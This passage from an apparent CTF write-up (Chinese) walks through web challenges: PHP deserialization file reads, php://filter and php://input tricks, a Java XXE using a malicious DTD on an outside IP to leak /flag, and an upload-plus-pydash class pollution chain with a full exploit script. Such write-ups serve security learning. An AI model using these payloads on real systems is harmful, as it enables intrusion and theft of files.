class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;input&quot;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$read</span>) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$read</span>, <span class="hljs-string">&quot;f14g&quot;</span>)===<span class="hljs-literal">FALSE</span>)<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$read</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-variable">$input2</span> = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$input</span>;<br>    <span class="hljs-variable">$input2</span>-&gt;position = <span class="hljs-string">&quot;route.php&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>php://filter</code>读<code>route.php</code></p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;h1&gt;Here can you find the position of the flag!&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$position</span> = <span class="hljs-string">&quot;f14g.php&quot;</span>;<br><span class="hljs-variable">$gadget</span> = <span class="hljs-string">&quot;h1nt.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>再读<code>h1nt.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;position);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;position;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化，调用<code>__clone</code>方法时读<code>f14g.php</code><br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>=<span class="hljs-string">&#x27;f14g.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//read=h1nt.php&amp;input=O:4:&quot;test&quot;:1:&#123;s:8:&quot;position&quot;;s:8:&quot;f14g.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;***********&quot;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])!== <span class="hljs-string">&quot;flag&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])!==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>php://input</code>使得a的值为<code>flag</code>，b同理，d使用<code>php://filter</code>读文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/CodeCheck.png"></p><h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>访问靶机自动跳转到<code>/parser?body=%7B&quot;1&quot;%3A&quot;2&quot;%7D</code>，并返回<code>json</code><br>访问<code>/parser?body=1</code>，返回<code>plain</code></p><p>猜测这是一个类型解析器，可以解析输入的数据类型并返回</p><p>fuzz后发现支持xml格式，尝试利用xxe漏洞。因为是java环境，尝试使用<code>jar协议</code>，<a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html#jar-x2F-x2F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">原理参考</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-1.png"></p><p>vps上用flask构建一个恶意dtd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;!ENTITY % c SYSTEM <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;<br>&lt;!ENTITY % a <span class="hljs-string">&quot;&lt;!ENTITY remote SYSTEM &#x27;jar:http://20.2.129.79/1.zip!/%c;&#x27;&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>在apache上放一个1.zip，内容随意</p><p>当<code>jar协议</code>在<code>1.zip</code>中找不到<code>file://</code>中指定的文件时就会报错，通过报错回显文件内容</p><p>且过滤了<code>&quot;http</code>，可以使用<code>&quot;url:http</code>来绕过</p><p>最终payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;url:http://20.2.129.79:7777/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %b;</span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-2.png"></p><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>打开靶机后有一个文件上传功能</p><p>但是对路径，后缀，文件内容进行了检测</p><p>路径中过滤了<code>..</code>，不能进行目录穿越，只能存放在<code>/tmp/</code>下，·且后缀检查的黑名单较严格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_path</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = [<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&#x27;\.\.&#x27;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$black_list</span>) . <span class="hljs-string">&#x27;)/i&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$path</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_extension</span>(<span class="hljs-params"><span class="hljs-variable">$extension</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;phtml&#x27;</span>, <span class="hljs-string">&#x27;py&#x27;</span>, <span class="hljs-string">&#x27;pl&#x27;</span>,<span class="hljs-string">&#x27;pyc&#x27;</span>,<span class="hljs-string">&#x27;php7&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;ini&#x27;</span>,<span class="hljs-string">&#x27;htaccess&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$extension</span>),<span class="hljs-variable">$black_list</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">up_base64</span>(<span class="hljs-params"><span class="hljs-variable">$file_path</span>, <span class="hljs-variable">$base64</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(data:\s*image\/(\w*);base64,)/&#x27;</span>, <span class="hljs-variable">$base64</span>, <span class="hljs-variable">$result</span>)) &#123;<br><br>        <span class="hljs-variable">$type</span> = <span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_extension</span>(<span class="hljs-variable">$type</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-title function_ invoke__">time</span>() . <span class="hljs-string">&quot;/&quot;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$res</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$res</span>, <span class="hljs-number">0777</span>);<br>        &#125;<br>        <span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;    <span class="hljs-comment">//图片名以时间命名</span><br>        <span class="hljs-comment">//保存为文件</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$newFile</span>, <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$base64</span>)))) &#123;<br>            <span class="hljs-comment">//返回这个图片的路径</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$newFile</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;base64&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_path</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">up_base64</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>], <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;upload success&lt;/h1&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Hacker!&lt;/h1&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>同时扫描网址发现存在<code>/app</code>路由</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> challenge <span class="hljs-keyword">import</span> challenge<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">value: <span class="hljs-built_in">str</span></span>):<br>    black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br>    <span class="hljs-keyword">if</span> re.findall(<span class="hljs-string">&quot;r&#x27;[^\w\.\[\]]&#x27;&quot;</span>, value):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> black_list:<br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> value:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/set&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set</span>():<br>    key, value = request.json.get(<span class="hljs-string">&#x27;key&#x27;</span>), request.json.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> key <span class="hljs-keyword">or</span> <span class="hljs-built_in">type</span>(key) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Not key or key must be str&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) &gt; <span class="hljs-number">100</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key may be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(value) &gt; <span class="hljs-number">20</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value may  be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> value:<br>        game.complete(value)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key set success !&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value must be a string!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check(key):<br>        <span class="hljs-built_in">print</span>(key)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hacker!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-comment"># pydash?</span><br>    <span class="hljs-keyword">if</span> game.<span class="hljs-built_in">set</span>(key, value):<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Task updated!&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid task name!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_source</span>():<br>    fp = <span class="hljs-built_in">open</span>(__file__)<br>    res = fp.read()<br>    fp.close<br>    <span class="hljs-keyword">return</span> res.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot; &quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/get&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_date</span>():<br>    <span class="hljs-keyword">import</span> backdoor<br>    flag = backdoor.backdoor()<br>    sys.modules.pop(<span class="hljs-string">&quot;backdoor&quot;</span>)<br>    <span class="hljs-keyword">return</span> flag<br><br><br>game = challenge()<br>app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">3000</span>)<br></code></pre></td></tr></table></figure><p>其中有三个路由</p><p><code>/app</code>显示当前代码<br><code>/app/get</code>存在后门，有导入包的操作<br><code>/app/set</code>用于设置键值对</p><p>其中存在提示<code># pydash?</code>，表示通过<code>pydash</code>设置属性，而<code>pydash</code>低版本存在类污染，可以利用<code>pydash.set</code>来设置或覆盖属性值，也可以设置路径</p><p>在<code>/app/get</code>路由中存在一个<code>import</code>的操作，当<code>Python</code>解释器遇到<code>import</code>语句时，它会在<code>sys.path</code>变量中指定的路径中搜索模块，其中<code>sys.path[0]</code>则表示最初调用<code>Python</code>解释器的脚本所在的绝对路径</p><p>所以我们可以上传一个名称为<code>backdoor</code>的py文件，再利用<code>pydash.set</code>覆盖<code>sys.path[0]</code>的值，使其寻找包时找到我们的恶意包</p><p>同时题目中还存在一个waf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br></code></pre></td></tr></table></figure><p>可以利用<code>pydash.helpers</code>导入<code>inspect</code>来绕过</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-2.png"></p><p>还有一点要注意，上传时对<code>$type</code>进行了检查，不允许上传<code>py</code>类型的文件，但是<code>$type</code>的值是可控的，我们可以将其置空</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//line 32</span><br><span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>如果<code>$type</code>为空，就会在文件尾加一个点，例如<code>backdoor.py.</code></p><p>这里可以用<code>file_put_contents</code>的一个<code>trick</code>绕过，如图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-3.png"></p><p>例如<code>backdoor.py/.</code>，<code>file_put_contents</code>会自已给标准化成绝对路径</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>shell = <span class="hljs-string">&#x27;&#x27;&#x27;import os</span><br><span class="hljs-string">def backdoor():</span><br><span class="hljs-string">    return os.popen(&quot;cat /flag&quot;).read()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    data = <span class="hljs-string">&quot;data:image/;base64,&quot;</span> + base64.b64encode(shell.encode()).decode()<br>    start = <span class="hljs-built_in">int</span>(time.time())<br>    res = requests.post(<br>        url=url+<span class="hljs-string">&quot;index.php?action=base64&amp;path=backdoor.py/&quot;</span>, data=data)<br>    end = <span class="hljs-built_in">int</span>(time.time())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end+<span class="hljs-number">2</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        data = &#123;<br>            <span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;__init__.__globals__.pydash.helpers.inspect.sys.path[0]&quot;</span>,<br>            <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;/tmp/%s/&quot;</span> % (i)<br>        &#125;<br>        <span class="hljs-built_in">print</span>(data)<br>        requests.post(url=url+<span class="hljs-string">&quot;app/set&quot;</span>,json=data)<br>        res = requests.get(url=url+<span class="hljs-string">&quot;app/get&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag??&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text <span class="hljs-keyword">and</span> res.status_code != <span class="hljs-number">500</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exploit()<br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="zip"><a href="#zip" class="headerlink" 